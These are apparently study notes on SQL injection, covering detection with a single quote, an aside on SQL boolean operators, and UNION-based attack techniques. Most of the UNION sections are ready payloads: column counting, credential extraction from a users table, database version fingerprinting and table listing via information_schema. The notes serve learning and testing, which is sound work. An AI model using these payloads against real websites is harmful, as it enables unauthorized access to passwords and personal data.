
SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database

impact of sql injection :
A successful SQL injection attack can result in unauthorized access to sensitive data, such as passwords, credit card details, or personal user information

how to find the web site is vuln to sql injection
Submitting the single quote character `'` and looking for errors or other anomalies.

In SQL, a boolean condition is an expression that evaluates to either true or false. It is commonly used in the context of the WHERE clause of a SELECT, UPDATE, DELETE, or INSERT statement to filter or manipulate data based on certain conditions.

SQL does not have a dedicated boolean data type in the traditional sense. Instead, it uses various data types and expressions to represent boolean logic. Here are some common ways boolean conditions are represented in SQL:

1. **Comparison Operators**: SQL uses comparison operators to create boolean conditions by comparing two values. Some common comparison operators are:

   - `=` (equals)
   - `<>` or `!=` (not equals)
   - `<` (less than)
   - `>` (greater than)
   - `<=` (less than or equal to)
   - `>=` (greater than or equal to)

   For example:
   ```sql
   SELECT * FROM users WHERE age >= 18;
   ```

2. **Logical Operators**: SQL provides logical operators to combine multiple conditions into more complex boolean expressions. The main logical operators are:

   - `AND`: Returns true if both conditions on the left and right side are true.
   - `OR`: Returns true if at least one of the conditions on the left or right side is true.
   - `NOT`: Negates the result of the following condition.

   For example:
   ```sql
   SELECT * FROM products WHERE price <= 100 AND in_stock = true;
   ```

3. **IN Operator**: The IN operator is used to check if a value matches any value in a list. It is often used in combination with parentheses to specify the list of values.

   For example:
   ```sql
   SELECT * FROM products WHERE category IN ('Electronics', 'Appliances', 'Books');
   ```

4. **LIKE Operator**: The LIKE operator is used for pattern matching in string data. It allows you to search for values based on specific patterns.

   For example:
   ```sql
   SELECT * FROM customers WHERE name LIKE 'John%';
   ```

5. **IS NULL / IS NOT NULL**: These conditions are used to check for NULL values in a column.

   For example:
   ```sql
   SELECT * FROM orders WHERE shipped_date IS NULL;
   ```

These are just some examples of boolean conditions in SQL. You can combine them to create more complex conditions as needed to filter or manipulate data in your SQL queries.

The key thing here is that the double-dash sequence -- is a comment indicator in SQL, and means that the rest of the query is interpreted as a comment


Most SQL injection vulnerabilities arise within the `WHERE` clause of a `SELECT` query. This type of SQL injection is generally well-understood by experienced testers.

But SQL injection vulnerabilities can in principle occur at any location within the query, and within different query types. The most common other locations where SQL injection arises are:

- In `UPDATE` statements, within the updated values or the `WHERE` clause.
- In `INSERT` statements, within the inserted values.
- In `SELECT` statements, within the table or column name.
- In `SELECT` statements, within the `ORDER BY` clause.

~~~
`SELECT a, b FROM table1 UNION SELECT c, d FROM table2`
~~~

This SQL query will return a single result set with two columns, containing values from columns `a` and `b` in `table1` and columns `c` and `d` in `table2`.

For a `UNION` query to work, two key requirements must be met:

- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries.


## Determining the number of columns required in a SQL injection UNION attack


Find the number of columns in the database by this two methods 
we use the order by clause when we didn't know the name of the column

~~~
'ORDER BY 1-- '
'ORDER BY 2--'
'ORDER BY 3--'
~~~

By trying this we find the number of columns in database 

in the other method we use the null  
~~~
'UNION SELECT NULL--'
'UNION SELECT NULL,NULL--'
'UNION SELECT NULL,NULL,NULL--'etc
~~~

by these method we find the number columns in database

On Oracle, every `SELECT` query must use the `FROM` keyword and specify a valid table. There is a built-in table on Oracle called `dual` which can be used for this purpose. So the injected queries on Oracle would need to look like:
~~~
' UNION SELECT NULL FROM DUAL--
~~~


The reason for using `NULL` as the values returned from the injected `SELECT` query is that the data types in each column must be compatible between the original and the injected queries. Since `NULL` is convertible to every commonly used data type, using `NULL` maximizes the chance that the payload will succeed when the column count is correct.

## Finding columns with a useful data type in a SQL injection UNION attack

~~~
' UNION SELECT 'a',NULL,NULL,NULL-- 
' UNION SELECT NULL,'a',NULL,NULL-- 
' UNION SELECT NULL,NULL,'a',NULL-- 
' UNION SELECT NULL,NULL,NULL,'a'--
~~~



## Using a SQL injection UNION attack to retrieve interesting data

The database contains a table called `users` with the columns `username` and `password`.

~~~
' UNION SELECT username, password FROM users--
~~~



## Retrieving multiple values within a single column

~~~
' UNION SELECT NULL,username || '~' || password FROM users--
~~~

Double pipe is used for orcale database type it will vary by the software version

# SQL injection attack, querying the database type and version on Oracle

~~~
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
~~~

# SQL injection attack, querying the database type and version on MySQL and Microsoft

~~~
'UNION SELECT @@version,NULL#
~~~

## SQL injection attack, listing the database contents on non-Oracle databases


~~~
'UNION SELECT 'asd','asas'--
~~~

for the tables 

~~~
' UNION SELECT table_name, NULL FROM information_schema.tables-- 
~~~







